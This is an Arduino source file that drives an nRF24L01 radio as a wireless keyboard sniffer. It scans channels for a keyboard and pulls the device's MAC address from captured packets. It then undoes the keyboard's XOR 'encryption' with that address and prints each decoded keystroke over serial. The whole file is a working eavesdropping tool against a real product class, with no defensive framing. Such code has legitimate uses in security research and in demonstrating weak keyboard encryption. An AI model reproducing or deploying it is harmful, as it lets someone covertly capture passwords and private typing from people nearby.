#include <EEPROM.h>
#include <SPI.h>
#include "mhid.h"
#include "nRF24L01.h"
#include "RF24.h"
#include "printf.h"

#define RADIO_CE_PIN 9
#define RADIO_CSN_PIN 10
#define SERIAL_BAUDRATE 115200
#define EEPROM_LAST_CHANNEL_VALUE_ADDRESS  0x05 
#define PACKET_SIZE 16

uint8_t channel = 72; 
uint64_t keyboard_mac_address = 0;//0xA93ED4A2CD; 
RF24 radio(RADIO_CE_PIN, RADIO_CSN_PIN);
char last_character_received = '\0';
uint16_t lastSeq = 0;

void decrypt_packet(uint8_t* p)
{
  for (int i = 4; i < 15; i++)
    // The encryption key is the 5-byte MAC address and starts 4 bytes in (header is unencrypted)
    p[i] ^= keyboard_mac_address >> (((i - 4) % 5) * 8) & 0xFF;
}

void process_keystroke(uint8_t* p)
{
  char letter;
  uint8_t key = p[11] ? p[11] : p[10] ? p[10] : p[9];
  uint8_t meta = p[7];
  letter = hid_decode(key, meta);
  if(lastSeq == (p[5] << 8) + p[4])
  {
    Serial.print(" IGNORED: ");
    Serial.print(letter);
    return;
  }
  Serial.print(" CHAR: ");
  Serial.print(letter);
  Serial.print(" (");
  Serial.print(key, HEX);
  Serial.print(")");
  lastSeq = (p[5] << 8) + p[4];
  last_character_received = letter;
}

uint8_t flush_rx(void)
{
  uint8_t status;
  digitalWrite(RADIO_CSN_PIN, LOW);
  status = SPI.transfer( FLUSH_RX );
  digitalWrite(RADIO_CSN_PIN, HIGH);
  return status;
}

uint8_t write_to_nrf24l01_register(uint8_t reg, uint8_t value)                                       
{
  uint8_t status;
  digitalWrite(RADIO_CSN_PIN, LOW);
  status = SPI.transfer( W_REGISTER | ( REGISTER_MASK & reg ) );
  SPI.transfer(value);
  digitalWrite(RADIO_CSN_PIN, HIGH);
  return status;
}

void debug_print_packet(uint8_t* p)
{
  //Serial.println("-PKT START-");
  //for (int j = 0; j < PACKET_SIZE; j++)
  //{
  //  Serial.print(" ");
  //  Serial.print(j);
  //  if(j < 10) Serial.print(" ");
  //  Serial.print(" |");
 //}
 Serial.println("");
 Serial.print(millis());
 Serial.print(" | ");
  for (int j = 0; j < PACKET_SIZE; j++)
  {
    Serial.print(" ");
    if(p[j] <= 0xF) Serial.print(" ");
    Serial.print(p[j], HEX);
    Serial.print(" |");
  }
 // Serial.println("-PKT END-");
}

void scan()
{
  keyboard_mac_address = 0xAALL;
  uint8_t p[PACKET_SIZE];
  write_to_nrf24l01_register(0x02, 0x00);  // RF24 doesn't ever fully set this -- only certain bits of it
  write_to_nrf24l01_register(0x03, 0x00); // SETUP_AW - change address width to be 2 bytes [Page 54]
  radio.openReadingPipe(0, keyboard_mac_address);
  radio.disableCRC();
  radio.startListening();
  radio.printDetails();
  unsigned long channel_start_scan_time;
  
  while (1)
  {
    // FCC doc says freqs 2403-2480MHz, so we reduce 126 frequencies to 78, http://fccid.net/number.php?fcc=C3K1455&id=451957#axzz3N5dLDG9C
    if (channel > 80)
      channel = 3;

    Serial.print("Scanning channel ");
    Serial.print(2400 + channel);
    Serial.println(".");
    radio.setChannel(channel);

    channel_start_scan_time = millis();
    while (millis() - channel_start_scan_time < 500)
    {      
      if(radio.available())
      {
        radio.read(&p, PACKET_SIZE);
        
        if (p[4] == 0xCD)
        {
          debug_print_packet(p);

          // The data returned starts with the packet control field (PCF) which is 9 bits long [Page 25].
          // So our packet begins 9 bits in after the 5 byte mac. 
          // Everything is misaligned by 1 bit (due to PCF being 9 bits) so we have to shift everything 1 bit when comparing.
          // We remove the MSB (0x7F = 127) (last bit of the PCF) and check if the device type is 0x0A which is a keyboard. See http://farm6.static.flickr.com/5002/5354354594_f7bf64f3af.jpg
          if ((p[6] & 0x7F) << 1 == 0x0A)
          { 
            // Check if the packet type is 0x78 which is a keystroke or 0x38 which is idle (key is held down). 
            if (p[7] << 1 == 0x38 || p[7] << 1 == 0x78) 
            {
              Serial.print("Keyboard on channel ");
              Serial.print(channel);
              Serial.println(".");
              EEPROM.write(EEPROM_LAST_CHANNEL_VALUE_ADDRESS, channel);

              keyboard_mac_address = 0;
              for (int i = 0; i < 4; i++)
              {
                keyboard_mac_address += p[i];
                keyboard_mac_address <<= 8;
              }
              keyboard_mac_address += p[4]; // We know the first byte is 0xCD (Note: addressing is LSB first).
              Serial.print("Mac Address: ");
              Serial.print(p[0], HEX);
              Serial.print(p[1], HEX);
              Serial.print(p[2], HEX);
              Serial.print(p[3], HEX);
              Serial.print(p[4], HEX);
              Serial.println(".");
              write_to_nrf24l01_register(0x03, 0x03);  // SETUP_AW - change address width back to be 5 bytes [Page 54]
              return;
            }
          }
        }
      }
    }
    channel++;
  }
}

void setup()
{
  Serial.begin(SERIAL_BAUDRATE);
  printf_begin();
  Serial.println("Starting.");
  radio.begin();
  channel = EEPROM.read(EEPROM_LAST_CHANNEL_VALUE_ADDRESS);
  radio.setAutoAck(false);
  radio.setPALevel(RF24_PA_MIN); 
  radio.setDataRate(RF24_2MBPS);
  radio.setPayloadSize(32);
  radio.setChannel(channel);
  radio.printDetails();

  if(keyboard_mac_address == 0)
    scan();

  radio.enableDynamicPayloads();
  radio.stopListening();
  radio.openReadingPipe(1, keyboard_mac_address);
  radio.startListening();
  radio.printDetails();
}

void loop(void)
{
  uint8_t current_packet[PACKET_SIZE], last_packet[PACKET_SIZE];
  uint8_t pipe_num;

  if (radio.available(&pipe_num))
  {
    uint8_t payload_size = radio.getDynamicPayloadSize();
    radio.read(&current_packet, PACKET_SIZE);
    flush_rx();
    
    // Check if the packet type is 0x78 which is a keystroke.
    if (current_packet[1] == 0x78)
    {
      boolean is_the_same_as_the_last_packet = true;
      for (int j = 0; j < payload_size; j++)
      {
        if (current_packet[j] != last_packet[j])
        {
          is_the_same_as_the_last_packet = false;
        }
        last_packet[j] = current_packet[j];
      }
      if (is_the_same_as_the_last_packet)
     {
       Serial.println("");
       Serial.print("Duplicate packet sent. Ignoring.");
       return;
     }
    }
    
    decrypt_packet(current_packet);
    debug_print_packet(current_packet);
      
    // Check if the device type is 0x0A which is a keyboard. Then check if the HID code is not 0.
    if (current_packet[0] == 0x0A && current_packet[1] == 0x78 && current_packet[9] != 0)
    {
      process_keystroke(current_packet);
    }
  }
}
